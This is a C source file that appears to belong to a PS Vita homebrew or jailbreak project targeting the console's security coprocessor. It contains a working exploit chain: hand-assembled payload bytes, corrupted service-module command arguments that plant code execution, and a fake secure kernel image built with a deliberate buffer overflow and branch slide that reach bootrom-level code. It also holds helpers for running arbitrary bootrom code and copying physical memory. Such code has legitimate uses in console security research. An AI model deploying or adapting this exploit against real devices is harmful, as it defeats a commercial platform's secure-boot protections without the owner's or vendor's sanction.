/*
 * Copyright (C) 2021 skgleba
 *
 * This software may be modified and distributed under the terms
 * of the MIT license.  See the LICENSE file for details.
 */
#include "cmep.h"
#include "cmep-payloads/spl-defs.h"
#include "sk.h" // legit secure_kernel.enp header
#include "cmep-payloads/brom_framework/brom_framework.h" // tiny bootrom framework
#include "cmep-payloads/bromcpy/bromcpy.h" // cmep bootrom memcpy

// [@0x00040300] fake sk load success, loop code @ 0x00040310
static const unsigned char brom_stage2[] = {
  0x21, 0xc0, 0x00, 0xe0,   // movh r0, 0xe000
  0x01, 0x51,               // mov r1, 0x1
  0x0a, 0x01,               // sw r1, (r0)
  0x01, 0xc1, 0xaa, 0x00,   // mov r1, 0xaa
  0x05, 0xb0,               // bsr 0x00040310
  0xfa, 0xbf                // bra 0x00040308
};

// 
static const unsigned char ussm_50002_cleanup[] = {
  0x21, 0xc3, 0x02, 0xe0,
  0x3f, 0xd2, 0x00, 0x03,
  0x3a, 0x02,
  0x34, 0xc3, 0x04, 0x00,
  0x00, 0x52,
  0x3a, 0x02,
  0x01, 0x50,
  0x7a, 0xc0, 0x08, 0x00,
  0x1b, 0x46,
  0x17, 0x47,
  0x1f, 0x45,
  0x13, 0x4b,
  0x28, 0x4f,
  0xbe, 0x10,
  0x00, 0x00
};

static int callsm_ex(k_root* kroot, int smctx, uint32_t pa) {
    int ret;
    int weff;
    int twothousandsandfourteen;
    
    void* dat_2k = KDAT("SceSblSsSmComm", 1, 0);
    if (!dat_2k) {
        kroot->printf("couldnt find dat 2k\n");
        return -1;
    }
    int (*sus)(int pend) = KFUN("SceSblSsSmComm", 0xb4c);
    int (*call_n_cry)(int smctx, int unk, uint32_t cmdpa) = KFUN("SceSblSsSmComm", 0xafc);
    int (*world_economic_forum)(int a, int b, int c, int *d, int e) = KFUN("SceSblSsSmComm", 0xa5c);
    if (!sus || !call_n_cry || !world_economic_forum) {
        kroot->printf("world economic forum sus call n cry\n");
        return -2;
    }

    twothousandsandfourteen = *(int*)(dat_2k + 0x14);
    sus(0);
    ret = call_n_cry(smctx, 1, pa);
    if (ret >= 0) {
        ret = call_n_cry(smctx, 1, 1);
        if (ret >= 0) {
            weff = 1;
            ret = world_economic_forum(twothousandsandfourteen, 0x11, 5, &weff, 0);
            if (ret >= 0) {
                ret = *(uint32_t*)(dat_2k + 0xC);
                if (weff == 1)
                    ret = 0;
            } else
                kroot->printf("world economy failed 0x%X\n", ret);
        } else
            kroot->printf("write arm2cry1 2/2 failed 0x%X\n", ret);
    } else
        kroot->printf("write arm2cry1 1/2 failed 0x%X\n", ret);

    sus(0);

    return ret;
}

static int ussm_exec_1c(k_root* kroot, uint32_t ctx) {
    int sm_ret = -1;

    // prep bad args for prep
    smsched_call_sm_cmd* sm_cmd = kroot->venezia_spram;
    kroot->memset(kroot->venezia_spram, 0, 0x2000);
    sm_cmd->response = 0;
    sm_cmd->service_id = 0x50002;
    sm_cmd->size = sizeof(cmd_0x50002_t) + 0x10;
    sm_cmd->cargs.use_lv2_mode_0 = sm_cmd->cargs.use_lv2_mode_1 = 0;
    sm_cmd->cargs.list_count = 0x3d0;
    sm_cmd->cargs.total_count = 1;
    sm_cmd->cargs.list.lv1[0].addr = (void*)0x5c000;
    sm_cmd->cargs.list.lv1[0].length = 0x20;
    for (int i = 2; i < 0x3d0; i++) {
        sm_cmd->cargs.list.lv1[i].addr = (void*)0x0004a778;
        sm_cmd->cargs.list.lv1[i].length = 1;
    }

    // prepare
    kroot->printf("ONEXEC STEP1\n");
    int ret = callsm_ex(kroot, ctx, 0x1f850000);
    kroot->printf("ONEXEC STEP1 ret 0x%08X | 0x%08X\n", ret, sm_cmd->response);

    if (ret < 0)
        return ret;

    // prep bad args for exec plant
    kroot->memset(kroot->venezia_spram, 0, 0x2000);
    sm_cmd->response = -1;
    sm_cmd->service_id = 0x50002;
    sm_cmd->size = sizeof(cmd_0x50002_t) + 0x10;
    sm_cmd->cargs.use_lv2_mode_0 = sm_cmd->cargs.use_lv2_mode_1 = 0;
    sm_cmd->cargs.list_count = 0x3d;
    sm_cmd->cargs.total_count = 1;
    sm_cmd->cargs.list.lv1[0].addr = (void*)0x5c000;
    sm_cmd->cargs.list.lv1[0].length = 0x20;
    sm_cmd->cargs.list.lv1[0x10].addr = 0x1f85c121; // movh r1 0x1f85
    sm_cmd->cargs.list.lv1[0x11].addr = 0x3000c114; // or3 r1, r1, 0x3000
    sm_cmd->cargs.list.lv1[0x12].addr = 0x0080101e; // jmp r1
    for (int i = 0x3a; i < 0x3d; i++)
        sm_cmd->cargs.list.lv1[i].addr = (void*)0x04b9dc08;

    // plant code exec corrupting everything else lol
    kroot->printf("ONEXEC STEP2\n");
    ret = callsm_ex(kroot, ctx, 0x1f850000);
    kroot->printf("ONEXEC STEP2 ret 0x%08X | 0x%08X\n", ret, sm_cmd->response);

    return ret;
}

// hack cmep and enable f00d reset
static int cmep_init(int a0, int a1) {
    k_root* kroot = &g_kroot;
    // get funcs
    int (*load_ussm)(int* ctx, uint32_t * args) = KFUN("SceSblUpdateMgr", 0x3cb0 | 1);
    int (*stop_ussm)(int* ctx) = KFUN("SceSblUpdateMgr", 0x3b98 | 1);

    if (!kroot || !load_ussm || !stop_ussm)
        return -1;

    kroot->printf("[SNS][FUD] hello from cmep_install_spl, loading update_sm\n");

    // load update_service_sm
    uint32_t argbuf[8];
    kroot->memset(argbuf, 0, 0x20);
    int ctx = -1;
    int ret = load_ussm(&ctx, argbuf);
    if (ret < 0)
        return ret;
    
    kroot->memcpy(kroot->venezia_spram + 0x3000, ussm_50002_cleanup, sizeof(ussm_50002_cleanup));
    ret = ussm_exec_1c(kroot, ctx);
    kroot->printf("ussm_exec_1c ret 0x%08X\n", ret);

    kroot->printf("[SNS][FUD] all done, NOT stopping sm\n");
    return ret;
}

// construct the fake secure_kernel.enp @ 0x4c000000
static int brom_init(k_root* kroot) {
    if (!kroot)
        return -1;
    
    kroot->printf("[SNS][FUD] brom_init, cleaning tachyon eDRAM and pac DRAM\n");
    kroot->memset(kroot->tachyon_edram, 0, 0x200000);
    kroot->memset(kroot->pac_dram, 0, 0x20000);

    kroot->printf("[SNS][FUD] preparing the fake sk\n");
    // legit sk header and the bootrom payloads
    kroot->memcpy(kroot->pac_dram, secure_kernel_enp, 0x40);
    kroot->memcpy(kroot->pac_dram + 0x300, brom_stage2, 0x10);
    kroot->memcpy(kroot->pac_dram + 0x310, brom_framework_nmp, sizeof(brom_framework_nmp));
    kroot->memcpy(kroot->pac_dram + 0x3E0, "hellowo from cmep first_loader\n", sizeof("hellowo from cmep first_loader\n"));
    // buffer overflow
    *(uint32_t*)(kroot->pac_dram + 4) = 0x2c0;
    *(uint32_t*)(kroot->pac_dram + 0x10) = -0x2c0;
    // bra slide-back
    for (int skoff = 0x400; skoff < (0x20000 - 4); skoff -= -4) {
        *(uint32_t*)(kroot->pac_dram + skoff) = 0xbffebffe;
    }
    // bra brom_payload
    *(uint16_t*)(kroot->pac_dram + 0x400) = 0xbf00;

    return 0;
}

// run code using the cmep bootrom framework
static int brom_run(k_root* kroot, void* code, uint32_t size, uint32_t arg, int wellcheck) {
    if (!kroot || !code)
        return -1;

    //void (*wait)() = (void*)KFUN("SceKernelThreadMgr", 0x2fc8 | 1);

    kroot->printf("[SNS][FUD] brom_run_code(0x%X(0x%X) [0x%X])\n", code, arg, size);

    kroot->printf("[SNS][FUD] pacDRAM = 0x%X 0x%X 0x%X 0x%X\n", *(uint32_t*)kroot->pac_dram, *(uint32_t*)(kroot->pac_dram + 4), *(uint32_t*)(kroot->pac_dram + 8), *(uint32_t*)(kroot->pac_dram + 0xC));
    if (*(uint32_t*)kroot->pac_dram != 0xF00DF00D) {
        kroot->printf("[SNS][FUD] brom not ready - aborting\n");
        return -3;
    }
    
    volatile fm_nfo* fmnfo = kroot->tachyon_edram;
    kroot->memset((void*)fmnfo, 0, sizeof(fm_nfo));

    if (size) {
        kroot->printf("[SNS][FUD] copying code to tachyon edram\n");
        kroot->memset(kroot->tachyon_edram + 0x20, 0, 0x300);
        kroot->memcpy(kroot->tachyon_edram + 0x20, code, size);
        fmnfo->codepaddr = 0x1C000020;
    } else
        fmnfo->codepaddr = (uint32_t)code;

    fmnfo->magic = 0x14ff;
    fmnfo->exp_status = 0xAA;
    fmnfo->arg = arg;

    kroot->printf("[SNS][FUD] running custom brom code\n");
    __asm ("dmb sy");
    __asm ("dsb sy");
    fmnfo->status = 0x34;
    __asm ("dsb sy");
    __asm ("dmb sy");

    while (fmnfo->status != 0xAA) {
        if (wellcheck) {
            kroot->printf("[SNS][FUD] reg0 0x%08X | reg1 0x%08X\n", *(uint32_t*)(kroot->tachyon_edram + 0x10), *(uint32_t*)(kroot->tachyon_edram + 0x14));
            //wait(wellcheck);
        }
    }

    kroot->printf("[SNS][FUD] status 0x%X | resp 0x%X\n", fmnfo->status, fmnfo->resp);

    return (fmnfo->status == 0xAA) ? (int)fmnfo->resp : -2;
}

// PA memcpy using the brom framework
static int bromcpy(uint32_t dst, uint32_t src, uint32_t size, k_root* kroot) {
    if (!kroot)
        return -1;

    kroot->printf("[SNS][FUD] bromcpy 0x%X @ 0x%X -> 0x%X\n", size, src, dst);

    kroot->memset(kroot->pac_dram + 0x10, 0, 0x20000 - 0x10);

    bromcpy_args* args = kroot->pac_dram + 0x10;
    args->magic = 0xF00DF00D;
    args->src = src;
    args->dst = dst;
    args->sz = size;

    uint32_t ret = brom_run(kroot, (void*)bromcpy_nmp, sizeof(bromcpy_nmp), 0x4C000010, 0);
    kroot->printf("[SNS][FUD] brom_run ret 0x%X\n", ret);
    if ((uint32_t)ret != 0xF00D600D)
        return -2;
    
    return 0;
}